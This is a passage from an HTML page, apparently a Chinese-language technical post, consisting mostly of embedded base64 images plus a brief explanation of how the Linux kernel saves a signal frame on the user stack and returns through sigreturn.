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6dL3rtPSNvAb+1o1dgnEEFhhrO9jdIQy0fFAmdixjPVq7GL20BuP2+qnb5o6axAyiBpGpmGdvZYv0ivryO5tfKd0TFzua4RaNWqZ3gXDuyvY2UwmAiKw9AT0IsulZ6eYIlDlCPByvB6bdE09+tPnfGOd1upo9/YblhpL6zRb06eM7J7uiYZM3y59/B/2xmlNBo10pkQcunVxY5xFwLz0sZ9vX0rDiekihGHb0tN3PS5N88peKPyhT39ptWoLO3DLXhlmNNDpNWVNy47rb5vc6S3t5Vu5ruTCavrsb9KakCM6H5AW5bZp0sp6duyeRi7oEaWRz5QQ3kOxqzdGEGS8j+aIbXund1lERjTUNm+zib/zYkZa3E/DhbU9B27ZMzWmEDyIneP8/RZM5ynLuC9e8sc8/5Xq1EsC5LqDLrXG9VdNc+q3dI4IPF5Ud2Tng9IWuLx/hhd1HuwNLhZbY+u1aJternfG7gN+k0033/hgMxdXNKbmulDkpX8H+DbPbA29sHVEv0lEDnlFgK2QGYxDiLIdOA39TUrWa7FAPV64yqYXO/ozmEYDvQNgrSZt0rPP+1JiyhjTuXjOmFL2vffir+/P0kFen+7r92efItk2c99s+EDd2sNH9bJH+XiZK6MOB221d2Z6FyOBrDVhBJa0eZ8L5avjL7zs7X7rNF0riQJeDru1jzqyHfDFPU9Loyn3jPu7bdZm45x1JdQRfkN4CSUvkey0ZsdUR3i2qVu8LJL7GbDTEbbT+p0XOkLLJiLtPG/uuSyjDrO2hN8nOlWY9tbH72vEMTemzpV2Pg1srdVapxGV6bNnps0ABh9wYc5alFQmr2OMuvC7Q0cJHQ11atVO62s28c4KNh5hpIg1LnREjOh/o7XxjoswfqPwR6DRAVLamvjvw/7+DKSX8fpvJGvZ+K25cr/z7MjtDiwdXNciIALlIKAXWZYDloKKgAiIgAiIgAiIgAiIgAhULgGtgalc/spdBERABERABERABERABESgHAQkYMoBS0FFQAREQAREQAREQAREQAQql4AETOXyV+4iIAIiIAIiIAIiIAIiIALlICABUw5YCioCIiACIiACIiACIiACIlC5BCRgKpe/chcBERABERABERABERABESgHAQmYcsBSUBEQAREQAREQAREQAREQgcolIAFTufyVuwiIgAiIgAiIgAiIgAiIQDkISMCUA5aCioAIiIAIiIAIiIAIiIAIVC4BCZjK5a/cRUAEREAEREAEREAEREAEykFAAqYcsBRUBERABERABERABERABESgcglIwFQuf+UuAiIgAiIgAiIgAiIgAiJQDgISMOWApaAiIAIiIAIiIAIiIAIiIAKVS0ACpnL5K3cREAEREAEREAEREAEREIFyEJCAKQcsBRUBERABERABERABERABEahcAhIwlctfuYuACIiACIiACIiACIiACJSDwP8DFl4U7KLrdJ4AAAAASUVORK5CYIINCg==\" alt=\"Process of Signal Handlering\"></p>\n<ol>\n<li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>\n<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal     Frame。**需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>\n</ol>\n<p><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAscAAAJOCAYAAABbSao+AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAEXRFWHRTb2Z0d2FyZQBTbmlwYXN0ZV0Xzt0AACAASURBVHic7N13fNx14cfx980kl71HR9Jd6KZQ9hQLsgRFxo8lIuJEEPnhAn7yQ/jJUAERGYKIogKyS6EMGUXK7KS0dKVJkzZJs3O5fff7o5+2l8s3q017Sft6Ph7+kZufnOXyus99vp+vTVJMANBP0y6al+whALtl+WOnJnsIAIYwe7IHAAAAAAwVxDEAAABgEMcAAACAQRwDAAAABnEMAAAAGMQxAAAAYBDHAAAAgEEcAwAAAAZxDAAAABjEMQAAAGAQxwAAAIBBHAMAAAAGcQwAAAAYxDEAAABgEMcAAACAQRwDAAAABnEMAAAAGMQxAAAAYBDHAAAAgEEcAwAAAAZxDAAAABjEMQAAAGAQxwAAAIBBHAMAAAAGcQwAAAAYxDEAAABgEMcAAACAQRwDAAAABnEMAAAAGMQxAAAAYBDHAAAAgEEcAwAAAAZxDAAAABjEMQAAAGAQxwAAAIBBHAMAAAAGcQwAAAAYxDEAAABgEMcAAACAQRwDAAAABnEMAAAAGMQxAAAAYBDHAAAAgEEcAwAAAAZxDAAAABjEMQAAAGAQxwAAAIBBHAMAAAAGcQwAAAAYxDEAAABgEMcAAACAQRwDAAAABnEMAAAAGMQxAAAAYBDHAAAAgEEcAwAAAAZxDAAAABjOZA8AwL4lbdRoXXFMutzxF8Yi+vyttXq2JpqsYe03eP0BYPcQxwAGlbusTN84KS/h0ogWrtpAnO0FvP4AsHuIYwAA+slZ/jXdfvsFGuPu+7YKbtDfrr1WT24M7/FxARg8xDEAAP3kzJ6qU7/2ZU3o163XaOnNP9WTIo6B4YQD8gAAAACDOAYAAAAMllUAANBP0c5qLf5gqTpT4i+1y1M+TRNykjUqAIOJOAYwqHwbNujmv26RK/7CWERVVZFkDWm/wuu/ZwXXPqRzD30o4dJ0Hfrbz7ToqlFJGROAwUUcAxh